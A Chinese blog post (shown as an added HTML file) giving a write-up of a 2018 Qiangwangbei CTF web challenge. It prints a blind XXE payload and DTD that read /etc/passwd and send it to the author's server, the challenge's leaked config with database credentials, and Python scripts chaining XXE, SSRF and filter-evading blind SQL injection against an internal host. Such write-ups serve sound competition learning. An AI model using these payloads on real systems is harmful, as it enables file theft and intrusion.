@@ -1,0 +1,1113 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="9I2ZJGCGSFZ3JOIR2o2ugq8lnm-NLadndUPsCsXXgFc" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="强网杯 web" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="教育机构的培训平台这题比赛的时候好像是0解，赛后趁着题目没关各种踩坑后后才做出来…给了域名一打开发现未备案，那就用ip访问呗，先按照常规渗透思路来，查了下whois发现开了隐私保护，nmap扫了下端口发现还开了22和33899。总不可能是22端口爆破吧，那么访问33899端口。咋一看好像跟80端口的一样，然而在邮件页面却有不同。浏览了一会发现站点输入点不多就一个发邮件功能测试了一下发现80端口的发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯教育机构的培训平台writeup">
+<meta property="og:url" content="http://pupiles.com/qiangwangbei2.html">
+<meta property="og:site_name" content="Pupiles blog">
+<meta property="og:description" content="教育机构的培训平台这题比赛的时候好像是0解，赛后趁着题目没关各种踩坑后后才做出来…给了域名一打开发现未备案，那就用ip访问呗，先按照常规渗透思路来，查了下whois发现开了隐私保护，nmap扫了下端口发现还开了22和33899。总不可能是22端口爆破吧，那么访问33899端口。咋一看好像跟80端口的一样，然而在邮件页面却有不同。浏览了一会发现站点输入点不多就一个发邮件功能测试了一下发现80端口的发">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/j1.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/j2.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/j3.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/j4.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/j5.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/j6.PNG">
+<meta property="og:updated_time" content="2018-03-28T03:35:53.600Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="强网杯教育机构的培训平台writeup">
+<meta name="twitter:description" content="教育机构的培训平台这题比赛的时候好像是0解，赛后趁着题目没关各种踩坑后后才做出来…给了域名一打开发现未备案，那就用ip访问呗，先按照常规渗透思路来，查了下whois发现开了隐私保护，nmap扫了下端口发现还开了22和33899。总不可能是22端口爆破吧，那么访问33899端口。咋一看好像跟80端口的一样，然而在邮件页面却有不同。浏览了一会发现站点输入点不多就一个发邮件功能测试了一下发现80端口的发">
+<meta name="twitter:image" content="http://olgkg6ct5.bkt.clouddn.com/j1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://pupiles.com/qiangwangbei2.html"/>
+
+
+
+
+
+  <title> 强网杯教育机构的培训平台writeup | Pupiles blog </title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?a5cad5e7b7a8b5d3aea9f10d80c9f2b7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pupiles blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">菜的要死的程序猿和Web狗</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://pupiles.com/qiangwangbei2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pupil">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://olgkg6ct5.bkt.clouddn.com/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pupiles blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                强网杯教育机构的培训平台writeup
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-28T11:50:35+08:00">
+                2018-03-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/qiangwangbei2.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/qiangwangbei2.html" class="leancloud_visitors" data-flag-title="强网杯教育机构的培训平台writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="教育机构的培训平台"><a href="#教育机构的培训平台" class="headerlink" title="教育机构的培训平台"></a>教育机构的培训平台</h1><p>这题比赛的时候好像是0解，赛后趁着题目没关各种踩坑后后才做出来…<br><img src="http://olgkg6ct5.bkt.clouddn.com/j1.PNG" alt=""><br>给了域名一打开发现未备案，那就用ip访问呗，先按照常规渗透思路来，查了下whois发现开了隐私保护，nmap扫了下端口发现还开了22和33899。总不可能是22端口爆破吧，那么访问33899端口。咋一看好像跟80端口的一样，然而在邮件页面却有不同。浏览了一会发现站点输入点不多就一个发邮件功能<br><img src="http://olgkg6ct5.bkt.clouddn.com/j2.PNG" alt=""><br>测试了一下发现80端口的发邮件功能好像并没有什么卵用，于是开始主攻33899端口。。测试了xss和sql注入无果后随手打个xxe发现出现xml报错<br><img src="http://olgkg6ct5.bkt.clouddn.com/j3.PNG" alt=""><br>那么很明显是个blind xxe漏洞了，但是一番测试后怎么都收不到请求，猜想像以前08067ctf那样过滤了实体引用，于是把实体引用定义在了dtd里，果然收到了请求,payload<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">xml</div><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % dtd SYSTEM "yourvpsip/evil.dtd"&gt;</div><div class="line">%dtd;]&gt;</div><div class="line">&lt;root/&gt;</div><div class="line">dtd</div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/read=/convert.base64-encode/resource=/etc/passwd"&gt;</div><div class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://yourvpsip/?file=%file;'&gt;"&gt;</div><div class="line">%all;</div><div class="line">%send;</div></pre></td></tr></table></figure></p>
+<p>那么我们尝试用伪协议读一下源码，发现没有价值的信息，改下dtd读一下config.php<br><img src="http://olgkg6ct5.bkt.clouddn.com/j4.PNG" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">//error_reporting(E_ALL^E_NOTICE^E_WARNING);</span></div><div class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</div><div class="line">define(BASEDIR, <span class="string">"/var/www/52dandan.club/"</span>);</div><div class="line">define(FLAG_SIG, <span class="number">1</span>);</div><div class="line">define(SECRETFILE,<span class="string">'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431'</span>);</div><div class="line"><span class="comment">//global $error_msg;</span></div><div class="line">$DBHOST = <span class="string">"127.0.0.1"</span>;</div><div class="line">$DBUSER = <span class="string">"root"</span>;</div><div class="line">$DBPASS = <span class="string">"QWB2018qwb@)!*"</span>;</div><div class="line"><span class="comment">//$DBPASS = "";</span></div><div class="line">$DBNAME = <span class="string">"QWB1234"</span>;</div><div class="line">$mysqli = @<span class="keyword">new</span> mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME,<span class="number">3306</span>);</div><div class="line"><span class="keyword">if</span>(mysqli_connect_errno())&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"no sql connection!!!"</span>.mysqli_connect_error();</div><div class="line">    $mysqli=<span class="keyword">null</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://olgkg6ct5.bkt.clouddn.com/j5.PNG" alt=""><br>得到flag第一部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">5bdd3b0ba1fcb40</div></pre></td></tr></table></figure></p>
+<p>找了一圈后没找到第二部分于是开始内网渗透，首先根据提示<code>arp -a</code>联想到读取arp表，于是尝试读取<code>proc/net/arp</code>发现出错<br><img src="http://olgkg6ct5.bkt.clouddn.com/j6.PNG" alt=""><br>但是并不是文件不存在报的错，于是猜想是没有权限或者文件太大无法读取，在网上搜索了一番后找到了一种用zlib压缩数据的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/read=zlib.deflate/convert.base64-encode/resource=/proc/net/arp</div></pre></td></tr></table></figure></p>
+<p>打了一下后成功读取到数据，然后用脚本还原一下即可出数据<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$str = file_get_contents(<span class="string">'./flag.txt'</span>);</div><div class="line">$str = str_replace(<span class="string">" "</span>,<span class="string">"+"</span>,$str);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str)</span></span>&#123;</div><div class="line">	$str = base64_decode($str);</div><div class="line">	$str = gzinflate($str);</div><div class="line">	<span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line">print_r(decode($str));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>然后尼玛给了一堆ip…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IP address HW type Flags HW address Mask Device 192.168.223.127 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.144 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.17 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.143 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.125 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.158 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.161 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.141 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.156 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.139 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.154 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.134 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.137 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.152 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.132 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.151 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.130 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.149 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.18 0x1 0x2 02:42:c0:a8:df:12 * eth0 192.168.223.128 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.126 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.147 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.1 0x1 0x2 02:42:91:f9:c9:d4 * eth0 192.168.223.142 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.145 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.160 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.140 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.159 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.138 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.157 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.136 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.155 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.135 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.150 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.153 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.133 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.148 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.131 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.146 0x1 0x0 00:00:00:00:00:00 * eth0 192.168.223.129 0x1 0x0 00:00:00:00:00:00 * eth0</div></pre></td></tr></table></figure></p>
+<p>随便访问一个发现返回没有该主机，猜测是静态写入了一堆垃圾数据，然后里面有一个应该是真正的内网地址。所以写了个脚本（这里简单介绍一下脚本的思路，因为是内网环境，脚本并不是那么好写，大致思路是在服务器上写一个脚本挂在服务器上一边动态修改dtd文件一边发包)得出<br><code>192.168.223.18</code>是真实内网地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url = <span class="string">'http://39.107.33.75:33899/common.php'</span></div><div class="line">s = requests.Session()</div><div class="line">result = <span class="string">''</span></div><div class="line">data = &#123;<span class="string">"name"</span>:<span class="string">"pupiles"</span>,<span class="string">"email"</span>:<span class="string">"ssadasdasd@gmail.com"</span>,</div><div class="line"><span class="string">"comment"</span>:<span class="string">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line">	&lt;!DOCTYPE root [</div><div class="line">	&lt;!ENTITY % dtd SYSTEM "http://52.199.13.19/evil.dtd"&gt;</div><div class="line">	%dtd;]&gt;</div><div class="line">	&lt;root/&gt;"""</div><div class="line">	&#125;</div><div class="line"><span class="keyword">with</span> open(<span class="string">'ip.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">	ip = f.read().split(<span class="string">'\n'</span>)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</div><div class="line">		f = open(<span class="string">'./evil.dtd'</span>,<span class="string">'w'</span>)</div><div class="line">		payload2 = <span class="string">"""&lt;!ENTITY % file SYSTEM "http://&#123;&#125;"&gt;</span></div><div class="line">				&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://52.199.13.19/?file=%file;'&gt;"&gt;</div><div class="line">				%all;</div><div class="line">				%send;""".format(ip[i])</div><div class="line">		f.write(payload2)</div><div class="line">		f.close()</div><div class="line">		<span class="keyword">print</span> payload2</div><div class="line">		r = s.post(url,data=data)</div><div class="line">		<span class="comment">#print r.contetn</span></div><div class="line">		<span class="keyword">if</span> <span class="string">"No route to host in"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</div><div class="line">			<span class="keyword">print</span> ip[i]</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
+<p>这时候发现这个ip的主页同样由于数据过大无法直接返回，这里又踩了一个坑，按理说这里是要读内网的文件应该不能用php伪协议了吧，然而尝试了各种方法无果后回到最初的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/</div></pre></td></tr></table></figure></p>
+<p>发现居然真的可以，原因是内网服务开启了url_open，但是发现<code>index.html</code>主页并没有flag，于是尝试爆破路径发现一个<code>test.php</code>，尝试读取后返回结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">I Love DanDanOnline Shop System Testing!!!Our online sales system is coming soon.Now open the test interface to internal employees!!!This time is the last testing before online!!!So this time,we test the query and search interface at once !!!!start testing~~~~your goods&apos;s name is &apos;&apos;,your goods&apos;s price is &apos;&apos;,your goods&apos;s quantity is &apos;&apos;,your goods&apos;s total is &apos;&apos;,testing finish~~~~</div></pre></td></tr></table></figure></p>
+<p>刚看到这里的时候我一定是脑残了才会去以为是隐写，明显的传参数TT，于是接着爆破参数，尝试了各种参数<code>id,name,price,quantity,total</code>无果后仔细理解了一下原文意思，大致是这个参数要包含商品的名字，价格和总价，于是猜测不是good就是shop，结果发现是shop，然后尝试注入，到这里才算是真正入坑，因为内网实在不方面测试sql盲注，而且还过滤了一堆字符，肝了好久实在肝不出来(发现好多大师傅都卡这了)。最后实在没办法去问了出题人，出题人给了我一个白名单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$whitelist = &quot;﻿`\&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;()_.+-&apos;&quot;</div></pre></td></tr></table></figure></p>
+<p>过滤了<code>,=</code>等关键字符，还好没有过滤关键词，一番fuzz后找到一个可用的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3&apos;-(case%a0when((select%a0database())like%a0binary(&apos;________&apos;))then(0)else(1)end)-&apos;1</div></pre></td></tr></table></figure></p>
+<p>剩下就是写脚本盲注，flag第二部分在total字段里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bbf344452165c1471</div></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url = <span class="string">'http://39.107.33.75:33899/common.php'</span></div><div class="line">s = requests.Session()</div><div class="line">result = <span class="string">''</span></div><div class="line">data = &#123;<span class="string">"name"</span>:<span class="string">"pupiles"</span>,<span class="string">"email"</span>:<span class="string">"ssadasdasd@gmail.com"</span>,</div><div class="line"><span class="string">"comment"</span>:<span class="string">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line">        &lt;!DOCTYPE root [</div><div class="line">        &lt;!ENTITY % dtd SYSTEM "http://52.199.13.19/evil.dtd"&gt;</div><div class="line">        %dtd;]&gt;</div><div class="line">        &lt;root/&gt;"""</div><div class="line">        &#125;</div><div class="line"><span class="comment">#p1 = 'database()'</span></div><div class="line"><span class="comment">#p2 = 'select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where table_schema%a0like%a0'qwbinner''</span></div><div class="line"><span class="comment">#p3 = 'select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name%a0like%a0'albert_shop''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">28</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</div><div class="line">                f = open(<span class="string">'./evil.dtd'</span>,<span class="string">'w'</span>)</div><div class="line">				payload2 = <span class="string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('&#123;&#125;'))then(0)else(1)end)-'1"&gt;</span></div><div class="line">                                &lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://52.199.13.19/?file=%file;'&gt;"&gt;</div><div class="line">                                %all;</div><div class="line">                                %send;""".format(<span class="string">'_'</span>*i+chr(j)+<span class="string">'_'</span>*(<span class="number">27</span>-i))</div><div class="line">                f.write(payload2)</div><div class="line">                f.close()</div><div class="line">                <span class="keyword">print</span> <span class="string">'test &#123;&#125;'</span>.format(chr(j))</div><div class="line">                r = s.post(url,data=data)</div><div class="line">                <span class="comment">#print r.contetn</span></div><div class="line">                <span class="keyword">if</span> <span class="string">"Oti3a3LeLPdkPkqKF84xs="</span> <span class="keyword">in</span> r.content <span class="keyword">and</span> chr(j)!=<span class="string">'_'</span>:</div><div class="line">                        result += chr(j)</div><div class="line">                        <span class="keyword">print</span> chr(j)</div><div class="line">                        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure></p>
+<p>注意用这个payload的时候要先猜长度<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</div><div class="line">		f = open(<span class="string">'./evil.dtd'</span>,<span class="string">'w'</span>)</div><div class="line">		payload2 = <span class="string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name%a0like%a0'albert_shop')like%a0binary('&#123;&#125;'))then(0)else(1)end)-'1"&gt;</span></div><div class="line">				&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://52.199.13.19/?file=%file;'&gt;"&gt;</div><div class="line">				%all;</div><div class="line">				%send;""".format(<span class="string">'_'</span>*i)</div></pre></td></tr></table></figure></p>
+<p>综上所诉，flag为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QWB&#123;5bdd3b0ba1fcb40bbf344452165c1471&#125;</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 Pupil 的个人博客">Pupil</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="http://pupiles.com/qiangwangbei2.html" title="强网杯教育机构的培训平台writeup">强网杯教育机构的培训平台writeup</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="http://pupiles.com/qiangwangbei2.html" title="强网杯教育机构的培训平台writeup">http://pupiles.com/qiangwangbei2.html</a>
+        </li>
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2018年3月28日 - 11时03分
+        </li>  
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 Pupil 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> </br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+    <footer class="post-footer">
+		   
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          
+        </div>
+      
+
+      
